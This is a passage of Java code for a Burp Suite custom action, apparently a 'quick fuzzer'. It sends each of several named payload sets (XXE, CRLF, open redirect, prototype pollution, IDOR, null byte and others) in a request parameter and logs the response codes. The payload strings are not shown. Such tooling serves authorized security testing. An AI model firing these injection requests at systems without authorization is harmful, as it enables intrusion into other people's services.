            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with JSON Injection Payload '" + jsonPayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 15: Invalid Emails -------------------- //
    logging().logToOutput("[ === Testing Invalid Emails PAYLOADS === ] ");
    for (String emailPayload: EMAIL_BYPASS_PAYLOADS) {
        //String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, emailPayload, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
    		String result = "Invalid Email Payload: '" + emailPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with Invalid Email Payload '" + emailPayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 16: String Format Payloads -------------------- //
    logging().logToOutput("[ === Testing String Format PAYLOADS === ] ");
    for (String stringformatPayload: FORMAT_STRING_PAYLOADS) {
        //String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, stringformatPayload, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
    		String result = "Invalid String Format Payload: '" + stringformatPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with String Format Payload '" + stringformatPayload + "': " + e.getStackTrace());
        }
    }


    // -------------------------- Test 17: Business Logic PAYLOADS -------------------- //
    logging().logToOutput("[ === Testing Business Logic PAYLOADS === ] ");
    for (String bPayload: BUSINESS_LOGIC_PAYLOADS) {
        //String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, bPayload, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
    		String result = "Business Logic Payload: '" + bPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with Business Logic Payload '" + bPayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 18: XXE PAYLOADS -------------------- //
    logging().logToOutput("[ === Testing XXE PAYLOADS === ] ");
    for (String xxePayload: XXE_PAYLOADS) {
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, xxePayload, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
            String result = "XXE Payload: '" + xxePayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with XXE Payload '" + xxePayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 19: CRLF Injection PAYLOADS -------------------- //
    logging().logToOutput("[ === Testing CRLF Injection PAYLOADS === ] ");
    for (String crlfPayload: CRLF_PAYLOADS) {
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, crlfPayload, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
            String result = "CRLF Injection Payload: '" + crlfPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with CRLF Injection Payload '" + crlfPayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 20: Open Redirect PAYLOADS -------------------- //
    logging().logToOutput("[ === Testing Open Redirect PAYLOADS === ] ");
    for (String redirectPayload: OPEN_REDIRECT_PAYLOADS) {
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, redirectPayload, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
            String result = "Open Redirect Payload: '" + redirectPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with Open Redirect Payload '" + redirectPayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 21: Unicode Bypass PAYLOADS -------------------- //
    logging().logToOutput("[ === Testing Unicode Bypass PAYLOADS === ] ");
    for (String unicodePayload: UNICODE_BYPASS_PAYLOADS) {
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, unicodePayload, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
            String result = "Unicode Bypass Payload: '" + unicodePayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with Unicode Bypass Payload '" + unicodePayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 22: Null Byte PAYLOADS -------------------- //
    logging().logToOutput("[ === Testing Null Byte PAYLOADS === ] ");
    for (String nullPayload: NULL_BYTE_PAYLOADS) {
        String newValue = originalValue + nullPayload;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, newValue, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
            String result = "Null Byte Payload: '" + nullPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with Null Byte Payload '" + nullPayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 23: IDOR PAYLOADS -------------------- //
    logging().logToOutput("[ === Testing IDOR PAYLOADS === ] ");
    for (String idorPayload: IDOR_PAYLOADS) {
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, idorPayload, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
            String result = "IDOR Payload: '" + idorPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with IDOR Payload '" + idorPayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 24: Prototype Pollution PAYLOADS -------------------- //
    logging().logToOutput("[ === Testing Prototype Pollution PAYLOADS === ] ");
    for (String protoPayload: PROTOTYPE_POLLUTION_PAYLOADS) {
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, protoPayload, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
            String result = "Prototype Pollution Payload: '" + protoPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with Prototype Pollution Payload '" + protoPayload + "': " + e.getStackTrace());
        }
    }

    // -------------------------- Test 25: HTTP Parameter Pollution PAYLOADS -------------------- //
    logging().logToOutput("[ === Testing HTTP Parameter Pollution PAYLOADS === ] ");
    for (String hppPayload: HPP_PAYLOADS) {
        String newValue = originalValue + hppPayload;
        var modifiedRequest = originalRequest.withParameter(
            burp.api.montoya.http.message.params.HttpParameter.parameter(
                paramName, newValue, param.type()
            )
        );

        try {
            var httpRequestResponse = api().http().sendRequest(modifiedRequest);

            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = httpRequestResponse.response().statusCode();
            int responseLength = httpRequestResponse.response().body().length();
    
            String result = "HTTP Parameter Pollution Payload: '" + hppPayload;
            logging().logToOutput("[ === " + result + " -> Status: " + status + " === ]");

            // set annotations
            httpRequestResponse.annotations().setNotes(result);
            // send to organizer
            api().organizer().sendToOrganizer(httpRequestResponse);

            results.append(result + "\n");
            totalRequests++;
        } catch (Exception e) {
            logging().logToError("[ ======================================= ]");
            logging().logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
            logging().logToError("[ ======================================= ]");
            logging().logToError("Error with HTTP Parameter Pollution Payload '" + hppPayload + "': " + e.getStackTrace());
        }
    }

}

// ------------------------------------------------------------ //
// --------------- FUZZING ENDS ----------------------------- //

logging().logToOutput("[ ======================================= ]");
logging().logToOutput("[ === QUICK FUZZING DONE === ]");
logging().logToOutput("[ ======================================= ]\n");
logging().logToOutput("Parameters tested: " + allParams.size() + "\nTotal Requests: " + totalRequests + "\nCheck the organizer tab for output");
```

</details>
